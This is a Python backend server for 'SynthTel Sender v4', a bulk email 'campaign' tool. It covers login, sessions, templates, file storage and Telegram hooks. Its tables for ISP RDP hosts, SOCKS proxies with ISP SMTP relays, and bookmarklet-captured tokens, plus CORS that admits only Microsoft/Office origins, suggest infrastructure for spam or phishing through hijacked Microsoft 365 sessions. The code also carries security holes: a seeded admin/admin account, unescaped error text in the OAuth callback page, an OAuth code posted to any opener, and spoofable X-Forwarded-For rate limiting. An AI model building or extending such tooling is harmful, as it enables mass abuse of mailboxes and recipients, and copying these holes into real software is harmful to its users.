#!/usr/bin/env python3
"""
core/server.py — SynthTel Sender v4  (Module 10 / 10)
=======================================================
The HTTP server that wires all 9 core modules into a deployable backend.

This file contains ONLY:
  • Authentication (SQLite + bcrypt + session tokens + rate limiting)
  • HTTP routing (BaseHTTPRequestHandler)
  • Thin route handlers that delegate to core modules

All sending logic lives in the core modules — this file imports and calls them.

Usage:
    python3 server.py           # listen on 127.0.0.1:5001
    python3 server.py 5001      # explicit port

Drop-in replacement for synthtel_server.py:
    # Old systemd ExecStart:
    ExecStart=/usr/bin/python3 /opt/synthtel/synthtel_server.py
    # New:
    ExecStart=/usr/bin/python3 /opt/synthtel/core/server.py
"""

import base64
import hashlib
import json
import logging
import mimetypes
import os
import re
import secrets
import socket
import sqlite3
import subprocess
import sys
import time
import uuid
from datetime import datetime, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from threading import Lock, Thread
from urllib.error import HTTPError
from urllib.request import Request, urlopen

# ─── auto-install bcrypt if missing ───────────────────────────────────────
try:
    import bcrypt
    HAS_BCRYPT = True
except ImportError:
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "bcrypt",
             "--break-system-packages", "-q"],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        import bcrypt
        HAS_BCRYPT = True
    except Exception:
        HAS_BCRYPT = False

# ─── logging ──────────────────────────────────────────────────────────────
from logging.handlers import RotatingFileHandler

LOG_PATH = os.environ.get("SYNTHTEL_LOG", "/opt/synthtel/synthtel.log")
os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
_fh = RotatingFileHandler(LOG_PATH, maxBytes=2 * 1024 * 1024, backupCount=3)
_fh.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s", datefmt="%H:%M:%S"))
logging.basicConfig(level=logging.INFO, handlers=[_fh, logging.StreamHandler(sys.stdout)])
log = logging.getLogger(__name__)

import collections as _collections
_DEBUG_BUF: _collections.deque = _collections.deque(maxlen=200)
_dbg_lock = Lock()

def dbg(tag: str, msg: str, data=None):
    import datetime as _dt
    entry = {"t": _dt.datetime.now().strftime("%H:%M:%S.%f")[:-3],
             "tag": tag, "msg": str(msg)[:800],
             "data": str(data)[:400] if data is not None else None}
    with _dbg_lock:
        _DEBUG_BUF.append(entry)
    log.info("[%s] %s %s", tag, msg, data if data is not None else "")

# ─── core module imports ───────────────────────────────────────────────────
# Add parent dir to path so `python3 core/server.py` works from /opt/synthtel
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from core.campaign import process_campaign
    _CAMPAIGN_OK = True
except ImportError as _camp_err:
    _CAMPAIGN_OK = False
    _CAMPAIGN_ERR = str(_camp_err)
    def process_campaign(data):
        yield {"type": "error", "error": f"campaign.py not loaded: {_camp_err} — redeploy campaign.py"}
from core.tunnel_manager import open_ssh_socks, close_tunnel
from core.b2b_manager import B2BSession, B2BLead

try:
    from core import telegram_bot as tg
    TG_AVAILABLE = True
except Exception:
    TG_AVAILABLE = False
    tg = None


# ═══════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════

DB_PATH         = os.environ.get("SYNTHTEL_DB", "/opt/synthtel/synthtel.db")
FILES_DIR       = os.environ.get("SYNTHTEL_FILES", "/opt/synthtel/files")
SESSION_HOURS   = 24
MAX_ATTEMPTS    = 10
LOCKOUT_MINUTES = 15
MIN_PW_LEN      = 8
MAX_BODY_BYTES  = 50 * 1024 * 1024   # 50 MB hard cap (files can be larger)

# Pre-configured Azure App — set these once as env vars or in /opt/synthtel/.env
# Users will never need to enter credentials manually if these are set
_AZURE_CLIENT_ID     = os.environ.get("SYNTHTEL_AZURE_CLIENT_ID", "")
_AZURE_CLIENT_SECRET = os.environ.get("SYNTHTEL_AZURE_CLIENT_SECRET", "")
# Load from /opt/synthtel/.env if not in env
try:
    _env_path = "/opt/synthtel/.env"
    if os.path.exists(_env_path) and (not _AZURE_CLIENT_ID or not _AZURE_CLIENT_SECRET):
        for _line in open(_env_path).read().splitlines():
            if "=" in _line and not _line.startswith("#"):
                _k, _v = _line.split("=", 1)
                if _k.strip() == "SYNTHTEL_AZURE_CLIENT_ID":     _AZURE_CLIENT_ID     = _v.strip()
                if _k.strip() == "SYNTHTEL_AZURE_CLIENT_SECRET":  _AZURE_CLIENT_SECRET = _v.strip()
except Exception:
    pass

SESSIONS: dict       = {}   # token → {user_id, username, role, expires}
ACTIVE_CAMPAIGNS: dict = {}  # user_id → count of running campaigns (thread-safe via lock)
active_campaigns_lock = Lock()
LOGIN_ATTEMPTS: dict = {}   # ip → {count, last_attempt}

db_lock       = Lock()
sessions_lock = Lock()


# ═══════════════════════════════════════════════════════════════
# DATABASE & AUTH
# ═══════════════════════════════════════════════════════════════

def init_db():
    """Create tables and restore active sessions on startup."""
    with db_lock:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id            INTEGER PRIMARY KEY AUTOINCREMENT,
                username      TEXT    UNIQUE NOT NULL,
                password_hash TEXT    NOT NULL,
                salt          TEXT    NOT NULL,
                role          TEXT    DEFAULT 'user',
                active        INTEGER DEFAULT 1,
                expires_at    TEXT    DEFAULT NULL,
                created_at    TEXT    DEFAULT CURRENT_TIMESTAMP,
                last_login    TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                token    TEXT    PRIMARY KEY,
                user_id  INTEGER NOT NULL,
                username TEXT    NOT NULL,
                role     TEXT    NOT NULL,
                expires  TEXT    NOT NULL
            )
        """)
        # Schema migrations — safe to run on existing databases
        for migration in [
            "ALTER TABLE users ADD COLUMN expires_at TEXT DEFAULT NULL",
        ]:
            try:
                conn.execute(migration)
            except Exception:
                pass

        # User file storage table
        conn.execute("""
            CREATE TABLE IF NOT EXISTS user_files (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                category   TEXT    NOT NULL DEFAULT 'attachments',
                filename   TEXT    NOT NULL,
                orig_name  TEXT    NOT NULL,
                mime_type  TEXT    NOT NULL DEFAULT 'application/octet-stream',
                size_bytes INTEGER NOT NULL DEFAULT 0,
                created_at TEXT    DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # User saved configs (smtp, api, crm, owa, etc.)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS user_configs (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                config_type TEXT   NOT NULL,
                label      TEXT    NOT NULL,
                data       TEXT    NOT NULL,
                created_at TEXT    DEFAULT CURRENT_TIMESTAMP,
                updated_at TEXT    DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # User templates table
        conn.execute("""
            CREATE TABLE IF NOT EXISTS user_templates (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                name       TEXT    NOT NULL,
                subject    TEXT    NOT NULL DEFAULT '',
                html       TEXT    NOT NULL DEFAULT '',
                plain      TEXT    NOT NULL DEFAULT '',
                is_builtin INTEGER DEFAULT 0,
                created_at TEXT    DEFAULT CURRENT_TIMESTAMP,
                updated_at TEXT    DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # ── Telegram config table ──────────────────────────────────────────
        conn.execute("""
            CREATE TABLE IF NOT EXISTS tg_config (
                key   TEXT PRIMARY KEY,
                value TEXT NOT NULL DEFAULT ''
            )
        """)

        # ── Support tickets ─────────────────────────────────────────────────
        conn.execute("""
            CREATE TABLE IF NOT EXISTS support_tickets (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                subject    TEXT    NOT NULL,
                status     TEXT    NOT NULL DEFAULT 'open',
                priority   TEXT    NOT NULL DEFAULT 'normal',
                created_at TEXT    DEFAULT CURRENT_TIMESTAMP,
                updated_at TEXT    DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS ticket_messages (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                ticket_id  INTEGER NOT NULL,
                sender_id  INTEGER NOT NULL,
                sender_name TEXT   NOT NULL,
                is_admin   INTEGER DEFAULT 0,
                body       TEXT    NOT NULL,
                created_at TEXT    DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS isp_rdps (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                client_id  TEXT    NOT NULL,
                label      TEXT, host TEXT NOT NULL,
                ssh_port   TEXT DEFAULT '22', usr TEXT, pass TEXT,
                os TEXT DEFAULT 'windows', status TEXT DEFAULT 'undeployed',
                data TEXT, updated_at TEXT DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, client_id)
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS isp_proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL, client_id TEXT NOT NULL,
                label TEXT, host TEXT NOT NULL, port TEXT DEFAULT '17521',
                usr TEXT, pass TEXT, type TEXT DEFAULT 'socks5',
                isp_smtp_host TEXT, isp_smtp_port TEXT DEFAULT '25',
                from_domain TEXT, status TEXT DEFAULT 'untested',
                data TEXT, updated_at TEXT DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, client_id)
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS isp_assignments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL, rdp_client_id TEXT NOT NULL,
                proxy_client_id TEXT NOT NULL, UNIQUE(user_id, rdp_client_id)
            )
        """)
        # Schema migrations for new tables
        for migration in [
            "CREATE INDEX IF NOT EXISTS idx_user_files_user ON user_files(user_id,category)",
            "CREATE INDEX IF NOT EXISTS idx_user_configs_user ON user_configs(user_id,config_type)",
            "CREATE INDEX IF NOT EXISTS idx_user_templates_user ON user_templates(user_id)",
            """CREATE TABLE IF NOT EXISTS campaign_runs (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id     INTEGER NOT NULL,
                name        TEXT    NOT NULL DEFAULT 'Campaign',
                status      TEXT    NOT NULL DEFAULT 'running',
                method      TEXT    DEFAULT 'smtp',
                sent        INTEGER NOT NULL DEFAULT 0,
                failed      INTEGER NOT NULL DEFAULT 0,
                total       INTEGER NOT NULL DEFAULT 0,
                started_at  TEXT    DEFAULT CURRENT_TIMESTAMP,
                finished_at TEXT
            )""",
            "CREATE INDEX IF NOT EXISTS idx_campaign_runs_user ON campaign_runs(user_id)",
            """CREATE TABLE IF NOT EXISTS saved_campaigns (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id     INTEGER NOT NULL,
                name        TEXT    NOT NULL,
                config      TEXT    NOT NULL DEFAULT '{}',
                checkpoint  INTEGER NOT NULL DEFAULT 0,
                sent        INTEGER NOT NULL DEFAULT 0,
                total       INTEGER NOT NULL DEFAULT 0,
                created_at  TEXT    DEFAULT CURRENT_TIMESTAMP,
                updated_at  TEXT    DEFAULT CURRENT_TIMESTAMP
            )""",
            "CREATE INDEX IF NOT EXISTS idx_saved_campaigns_user ON saved_campaigns(user_id)",
            "ALTER TABLE user_files ADD COLUMN display_name TEXT DEFAULT NULL",
            # Telegram / security columns on users
            "ALTER TABLE users ADD COLUMN tg_chat_id TEXT DEFAULT NULL",
            "ALTER TABLE users ADD COLUMN tg_username TEXT DEFAULT NULL",
            "ALTER TABLE users ADD COLUMN tg_2fa_enabled INTEGER DEFAULT 0",
            "ALTER TABLE users ADD COLUMN tg_admin_tier TEXT DEFAULT NULL",
            "ALTER TABLE users ADD COLUMN role_tier TEXT DEFAULT NULL",
            # User token key with expiry
            "ALTER TABLE users ADD COLUMN api_key TEXT DEFAULT NULL",
            "ALTER TABLE users ADD COLUMN api_key_expires TEXT DEFAULT NULL",
            "CREATE INDEX IF NOT EXISTS idx_tickets_user ON support_tickets(user_id,status)",
            "CREATE INDEX IF NOT EXISTS idx_ticket_msgs ON ticket_messages(ticket_id)",
            # Add method column to campaign_runs if missing (old DBs don't have it)
            "ALTER TABLE campaign_runs ADD COLUMN method TEXT DEFAULT 'smtp'",
        ]:
            try:
                conn.execute(migration)
            except Exception:
                pass  # column already exists — safe to ignore

        # Seed default admin if no users exist
        if conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 0:
            salt = secrets.token_hex(16)
            pw   = hash_password("admin") if HAS_BCRYPT else hash_password("admin", salt)
            conn.execute(
                "INSERT INTO users (username, password_hash, salt, role) VALUES (?,?,?,?)",
                ("admin", pw, salt, "admin"),
            )
            print("✦ Default admin: username=admin / password=admin")
            print("✦ CHANGE THIS PASSWORD IMMEDIATELY!")

        # Purge expired sessions
        conn.execute("DELETE FROM sessions WHERE expires < ?", (datetime.now().isoformat(),))
        conn.commit()

        # Restore valid sessions into memory (so server restarts don't log users out)
        rows = conn.execute(
            "SELECT token, user_id, username, role, expires FROM sessions"
        ).fetchall()
        conn.close()

    loaded = 0
    with sessions_lock:
        for token, uid, uname, role, exp_str in rows:
            try:
                exp = datetime.fromisoformat(exp_str)
                if datetime.now() < exp:
                    SESSIONS[token] = {
                        "user_id": uid, "username": uname,
                        "role": role, "expires": exp,
                    }
                    loaded += 1
            except Exception:
                pass
    if loaded:
        log.info("Restored %d session(s) from database", loaded)


def _cleanup_loop():
    """Background thread: purge expired sessions every 5 minutes."""
    while True:
        time.sleep(300)
        now = datetime.now()
        with sessions_lock:
            expired = [t for t, s in SESSIONS.items() if now > s["expires"]]
            for t in expired:
                del SESSIONS[t]
        if expired:
            log.info("Cleanup: purged %d expired sessions", len(expired))
        stale = [ip for ip, a in LOGIN_ATTEMPTS.items()
                 if (now - a["last_attempt"]).total_seconds() > LOCKOUT_MINUTES * 240]
        for ip in stale:
            LOGIN_ATTEMPTS.pop(ip, None)


Thread(target=_cleanup_loop, daemon=True).start()


def hash_password(password: str, salt: str = None) -> str:
    if HAS_BCRYPT:
        return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    salt = salt or secrets.token_hex(16)
    return hashlib.sha256((password + salt).encode()).hexdigest()


def verify_password(password: str, stored_hash: str, salt: str = None) -> bool:
    if HAS_BCRYPT and stored_hash.startswith("$2"):
        try:
            return bcrypt.checkpw(password.encode(), stored_hash.encode())
        except Exception:
            return False
    if salt:
        return hashlib.sha256((password + salt).encode()).hexdigest() == stored_hash
    return False


def authenticate(username: str, password: str) -> dict | None:
    with db_lock:
        conn = sqlite3.connect(DB_PATH)
        row  = conn.execute(
            "SELECT id, password_hash, salt, role, active, expires_at FROM users WHERE username=?",
            (username,),
        ).fetchone()
        conn.close()

    if not row:
        # Constant-time dummy check — prevent username enumeration via timing
        if HAS_BCRYPT:
            bcrypt.checkpw(b"x", bcrypt.hashpw(b"x", bcrypt.gensalt(rounds=4)))
        return None

    uid, pw_hash, salt, role, active, expires_at = row

    if not active:
        return None

    if expires_at:
        try:
            if datetime.now() > datetime.fromisoformat(expires_at):
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("UPDATE users SET active=0 WHERE id=?", (uid,))
                    conn.commit(); conn.close()
                return None
        except Exception:
            pass

    if not verify_password(password, pw_hash, salt):
        return None

    # Auto-upgrade legacy SHA-256 to bcrypt
    if HAS_BCRYPT and not pw_hash.startswith("$2"):
        try:
            new_hash = hash_password(password)
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET password_hash=?, salt='' WHERE id=?", (new_hash, uid))
                conn.commit(); conn.close()
            log.info("Upgraded password hash to bcrypt for '%s'", username)
        except Exception as e:
            log.warning("Hash upgrade failed for '%s': %s", username, e)

    return {"id": uid, "username": username, "role": role}


def create_session(user: dict) -> str:
    token   = secrets.token_hex(32)
    expires = datetime.now() + timedelta(hours=SESSION_HOURS)
    with sessions_lock:
        SESSIONS[token] = {
            "user_id": user["id"], "username": user["username"],
            "role": user["role"], "expires": expires,
        }
    with db_lock:
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT OR REPLACE INTO sessions (token,user_id,username,role,expires) VALUES (?,?,?,?,?)",
            (token, user["id"], user["username"], user["role"], expires.isoformat()),
        )
        conn.execute("UPDATE users SET last_login=? WHERE id=?",
                     (datetime.now().isoformat(), user["id"]))
        conn.execute("DELETE FROM sessions WHERE expires < ?", (datetime.now().isoformat(),))
        conn.commit(); conn.close()
    return token


def get_session(token: str) -> dict | None:
    if not token or len(token) != 64:
        return None
    with sessions_lock:
        sess = SESSIONS.get(token)
    if sess:
        if datetime.now() > sess["expires"]:
            with sessions_lock:
                SESSIONS.pop(token, None)
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("DELETE FROM sessions WHERE token=?", (token,))
                conn.commit(); conn.close()
            return None
        return sess
    # Not in memory — check DB (e.g. multi-process or restart race)
    with db_lock:
        conn = sqlite3.connect(DB_PATH)
        row  = conn.execute(
            "SELECT user_id, username, role, expires FROM sessions WHERE token=?", (token,),
        ).fetchone()
        conn.close()
    if not row:
        return None
    uid, uname, role, exp_str = row
    try:
        exp = datetime.fromisoformat(exp_str)
    except Exception:
        return None
    if datetime.now() > exp:
        with db_lock:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM sessions WHERE token=?", (token,))
            conn.commit(); conn.close()
        return None
    sess = {"user_id": uid, "username": uname, "role": role, "expires": exp}
    with sessions_lock:
        SESSIONS[token] = sess
    return sess


def check_rate_limit(ip: str) -> bool:
    now = datetime.now()
    a   = LOGIN_ATTEMPTS.get(ip, {"count": 0, "last_attempt": now})
    if (now - a["last_attempt"]).total_seconds() > LOCKOUT_MINUTES * 60:
        LOGIN_ATTEMPTS[ip] = {"count": 0, "last_attempt": now}
        return True
    return a["count"] < MAX_ATTEMPTS


def record_attempt(ip: str):
    now = datetime.now()
    a   = LOGIN_ATTEMPTS.get(ip, {"count": 0, "last_attempt": now})
    a["count"] += 1; a["last_attempt"] = now
    LOGIN_ATTEMPTS[ip] = a


# ═══════════════════════════════════════════════════════════════
# B2B SESSION REGISTRY
# One B2BSession object per authenticated user (keyed by user_id)
# ═══════════════════════════════════════════════════════════════

_b2b_sessions: dict = {}   # user_id → B2BSession
_PENDING_TOKENS: dict = {}  # email → {token, ts} from bookmarklet
_b2b_lock = Lock()


def _get_b2b(user_id: int) -> B2BSession:
    with _b2b_lock:
        if user_id not in _b2b_sessions:
            _b2b_sessions[user_id] = B2BSession()
        return _b2b_sessions[user_id]


# ═══════════════════════════════════════════════════════════════
# HTTP HANDLER
# ═══════════════════════════════════════════════════════════════

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle each request in a separate thread — allows concurrent campaigns."""
    daemon_threads = True  # threads die when main server dies
    allow_reuse_address = True

class SynthTelHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    # ── helpers ──────────────────────────────────────────────

    def _cors(self, origin=None):
        allowed = origin if origin and ("microsoft" in origin or "office365" in origin or "office.com" in origin) else "same-origin"
        self.send_header("Access-Control-Allow-Origin", allowed or "same-origin")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.send_header("X-Content-Type-Options", "nosniff")

    def _json(self, code: int, data: dict):
        body = json.dumps(data).encode()
        self.send_response(code)
        self._cors(self.headers.get("Origin",""))
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self) -> dict:
        # Use pre-consumed bytes if available (set at top of do_POST)
        raw = getattr(self, "_body_bytes", None)
        if raw is None:
            n = int(self.headers.get("Content-Length", 0))
            if n > MAX_BODY_BYTES:
                raise ValueError(f"Body too large ({n} bytes)")
            raw = self.rfile.read(n) if n > 0 else b""
        return json.loads(raw) if raw else {}

    def _token(self) -> str | None:
        auth = self.headers.get("Authorization", "")
        return auth[7:] if auth.startswith("Bearer ") else None

    def _auth(self) -> dict | None:
        sess = get_session(self._token())
        if not sess:
            # Body already pre-consumed at top of do_POST — no need to drain here
            self._json(401, {"error": "Not authenticated"})
        return sess

    def _admin(self) -> dict | None:
        sess = self._auth()
        if sess and sess["role"] not in ("admin", "superadmin", "moderator"):
            self._json(403, {"error": "Admin access required"})
            return None
        return sess

    def _superadmin(self) -> dict | None:
        sess = self._auth()
        if sess and sess["role"] not in ("admin", "superadmin"):
            self._json(403, {"error": "Super admin access required"})
            return None
        return sess

    def _ip(self) -> str:
        return self.headers.get("X-Forwarded-For",
                                self.client_address[0]).split(",")[0].strip()

    def _stream_start(self):
        """Begin a chunked SSE-style stream response."""
        # Remove socket timeout for long-running campaigns — default is 60s
        # which kills campaigns after ~54 emails at 2s/email
        try:
            self.connection.settimeout(43200)  # 12 hours
        except Exception:
            pass
        self.send_response(200)
        self._cors()
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Accel-Buffering", "no")  # disable nginx buffering if present
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()

    def _stream_chunk(self, obj: dict):
        line = json.dumps(obj) + "\n"
        chunk = f"{len(line.encode()):x}\r\n{line}\r\n"
        self.wfile.write(chunk.encode())
        self.wfile.flush()

    def _stream_end(self):
        try:
            self.wfile.write(b"0\r\n\r\n")
            self.wfile.flush()
        except Exception:
            pass

    # ── OPTIONS ──────────────────────────────────────────────

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    # ── GET ──────────────────────────────────────────────────

    def do_GET(self):
        p = self.path

        if p == "/api/campaigns":
            if not (sess := self._auth()): return
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                rows = conn.execute(
                    "SELECT id, name, status, method, sent, failed, total, started_at, finished_at "
                    "FROM campaign_runs WHERE user_id=? ORDER BY started_at DESC LIMIT 50",
                    (sess["user_id"],)
                ).fetchall() if conn.execute(
                    "SELECT name FROM sqlite_master WHERE type='table' AND name='campaign_runs'"
                ).fetchone() else []
                conn.close()
            campaigns = [
                {"id": r[0], "name": r[1], "status": r[2], "method": r[3] or "smtp",
                 "sent": r[4], "failed": r[5], "total": r[6], "started_at": r[7], "finished_at": r[8]}
                for r in rows
            ]
            self._json(200, {"campaigns": campaigns})

        elif p.startswith("/oauth-callback"):
            # OAuth2 redirect landing page — posts code back to opener window
            from urllib.parse import parse_qs, urlparse
            qs   = parse_qs(urlparse(p).query)
            code = qs.get("code", [""])[0]
            err  = qs.get("error_description", qs.get("error", [""]))[0]
            html = f"""<!DOCTYPE html><html><head><title>SynthTel Auth</title>
<style>body{{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0f1117;color:#fff}}
.box{{text-align:center;padding:40px;background:#1a1d27;border-radius:12px;border:1px solid #333}}</style></head>
<body><div class="box">
{'<div style="color:#4ade80;font-size:48px">✓</div><h2>Signed in!</h2><p>Sending token to SynthTel…</p>' if code else f'<div style="color:#f87171;font-size:48px">✗</div><h2>Auth failed</h2><p>{err}</p>'}
</div>
<script>
var code={repr(code)}, err={repr(err)};
if(code && window.opener){{
  window.opener.postMessage({{type:'synthtel_oauth_code', code:code}}, '*');
  document.querySelector('p').textContent = '✓ Done! You can close this tab.';
  setTimeout(function(){{window.close();}}, 1500);
}} else if(!window.opener) {{
  document.querySelector('p').textContent = 'Code: ' + code + ' — copy this back to SynthTel.';
}}
</script></body></html>"""
            body = html.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        elif p == "/api/test":
            self._json(200, {"status": "ok", "version": "SynthTel Server v4 (modular)"})

        elif p == "/api/ping":
            # Latency probe for send-rate auto-detect — no auth required
            self._json(200, {"pong": True})

        elif p == "/api/me":
            if sess := self._auth():
                self._json(200, {"username": sess["username"], "role": sess["role"]})

        elif p == "/api/admin/users":
            if sess := self._admin():
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    rows = conn.execute(
                        "SELECT id,username,role,active,created_at,last_login,expires_at "
                        "FROM users ORDER BY id"
                    ).fetchall()
                    conn.close()
                users = [
                    {"id": r[0], "username": r[1], "role": r[2],
                     "active": bool(r[3]), "created_at": r[4],
                     "last_login": r[5], "expires_at": r[6]}
                    for r in rows
                ]
                self._json(200, {"users": users})

        elif p == "/api/b2b/status":
            if sess := self._auth():
                b2b = _get_b2b(sess["user_id"])
                self._json(200, b2b.status())

        elif p == "/api/b2b/folders":
            if sess := self._auth():
                b2b = _get_b2b(sess["user_id"])
                try:
                    folders = b2b.list_folders()
                    self._json(200, {"folders": folders})
                except Exception as e:
                    self._json(200, {"error": str(e)[:300]})

        elif p == "/api/b2b/config":
            if not (sess := self._auth()): return
            self._json(200, {
                "has_azure_app": bool(_AZURE_CLIENT_ID and _AZURE_CLIENT_SECRET),
                "azure_client_id_set": bool(_AZURE_CLIENT_ID),
            })

        elif p.startswith("/api/templates"):
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                rows = conn.execute(
                    "SELECT id,name,subject,html,plain,is_builtin,created_at,updated_at "
                    "FROM user_templates WHERE user_id=? ORDER BY updated_at DESC",
                    (uid,)
                ).fetchall()
                conn.close()
            templates = [{"id": r[0], "name": r[1], "subject": r[2], "html": r[3],
                          "plain": r[4], "builtin": bool(r[5]),
                          "created_at": r[6], "updated_at": r[7]} for r in rows]
            self._json(200, {"templates": templates})

        elif p.startswith("/api/files"):
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            # List files: /api/files?category=attachments (or all)
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(p)
            qs = parse_qs(parsed.query)
            category = qs.get("category", ["attachments"])[0]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                if category == "all":
                    rows = conn.execute(
                        "SELECT id,category,filename,orig_name,display_name,mime_type,size_bytes,created_at "
                        "FROM user_files WHERE user_id=? ORDER BY category,created_at DESC",
                        (uid,)
                    ).fetchall()
                else:
                    rows = conn.execute(
                        "SELECT id,category,filename,orig_name,display_name,mime_type,size_bytes,created_at "
                        "FROM user_files WHERE user_id=? AND category=? ORDER BY created_at DESC",
                        (uid, category)
                    ).fetchall()
                conn.close()
            files = [{"id": r[0], "category": r[1], "filename": r[2], "name": r[3],
                      "display_name": r[4] or r[3], "mime": r[5], "size": r[6],
                      "created_at": r[7]} for r in rows]
            self._json(200, {"files": files})

        elif p.startswith("/api/files/download/"):
            if not (sess := self._auth()): return
            try:
                fid = int(p.split("/")[4])
            except Exception:
                self._json(400, {"error": "Invalid file ID"}); return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT filename,orig_name,mime_type FROM user_files WHERE id=? AND user_id=?",
                    (fid, uid)
                ).fetchone()
                conn.close()
            if not row:
                self._json(404, {"error": "File not found"}); return
            fpath = os.path.join(FILES_DIR, str(uid), row[0])
            if not os.path.exists(fpath):
                self._json(404, {"error": "File missing from disk"}); return
            with open(fpath, "rb") as f:
                data_bytes = f.read()
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type", row[2])
            self.send_header("Content-Disposition", f'attachment; filename="{row[1]}"')
            self.send_header("Content-Length", str(len(data_bytes)))
            self.end_headers()
            self.wfile.write(data_bytes)

        elif p.startswith("/api/configs"):
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(p)
            qs = parse_qs(parsed.query)
            config_type = qs.get("type", ["smtp"])[0]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                rows = conn.execute(
                    "SELECT id,config_type,label,data,created_at FROM user_configs "
                    "WHERE user_id=? AND config_type=? ORDER BY id",
                    (uid, config_type)
                ).fetchall()
                conn.close()
            configs = [{"id": r[0], "type": r[1], "label": r[2],
                        "data": json.loads(r[3]), "created_at": r[4]} for r in rows]
            self._json(200, {"configs": configs})

        # ── Telegram: get config ────────────────────────────────────────────
        elif p == "/api/tg/config":
            if not (sess := self._admin()): return
            token  = tg.get_config("bot_token") if TG_AVAILABLE else ""
            notify = tg.get_config("notify_channel", "") if TG_AVAILABLE else ""
            enabled= tg.get_config("enabled", "0") if TG_AVAILABLE else "0"
            self._json(200, {
                "bot_token": "***" if token else "",
                "has_token": bool(token),
                "notify_channel": notify,
                "enabled": enabled == "1",
                "polling": TG_AVAILABLE,
            })

        # ── Telegram: my link status ──────────────────────────────────────
        elif p == "/api/tg/status":
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            tg_info = tg.get_user_tg(uid) if TG_AVAILABLE else None
            self._json(200, {
                "linked": bool(tg_info),
                "tg_username": tg_info.get("tg_username", "") if tg_info else "",
                "tg_2fa_enabled": bool(tg_info and tg_info.get("tg_2fa_enabled")),
            })

        # ── Admin: get all users with extended info ────────────────────────
        elif p == "/api/admin/users/all":
            if not (sess := self._admin()): return
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                rows = conn.execute(
                    "SELECT id,username,role,active,created_at,last_login,expires_at,"
                    "tg_chat_id,tg_username,tg_2fa_enabled,api_key,api_key_expires "
                    "FROM users ORDER BY id"
                ).fetchall()
                conn.close()
            users = [{"id":r[0],"username":r[1],"role":r[2],"active":bool(r[3]),
                      "created_at":r[4],"last_login":r[5],"expires_at":r[6],
                      "tg_linked":bool(r[7]),"tg_username":r[8]or"",
                      "tg_2fa":bool(r[9]),"has_api_key":bool(r[10]),
                      "api_key_expires":r[11]} for r in rows]
            self._json(200, {"users": users})

